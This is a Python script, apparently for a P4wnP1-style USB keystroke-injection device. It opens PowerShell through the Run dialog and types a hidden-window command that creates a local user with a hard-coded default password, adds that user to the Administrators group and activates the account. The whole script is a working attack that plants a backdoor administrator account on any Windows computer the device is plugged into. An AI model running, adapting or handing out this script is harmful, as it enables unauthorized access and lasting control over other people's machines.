#!/usr/bin/env python3
import os, sys, time
from hid_type import win_r, type_string

def main():
    print("[*] Adding hidden admin user...")

    user = os.getenv("P4WN_USER", "p4wnp1")
    password = os.getenv("P4WN_PASS", "P4wn@123")
    type_delay = 0.03

    win_r(); time.sleep(0.5)
    type_string("powershell\n", delay=type_delay)
    time.sleep(1.0)

    cmds = rf"""
net user {user} {password} /add
net localgroup Administrators {user} /add
net user {user} /active:yes
"""
    one_liner = ";".join([l.strip() for l in cmds.strip().splitlines()])
    type_string(f"powershell -nop -w hidden -c \"{one_liner}\"\n", delay=type_delay)

    print(f"[+] User '{user}' added to Administrators group.")

if __name__ == "__main__":
    main()
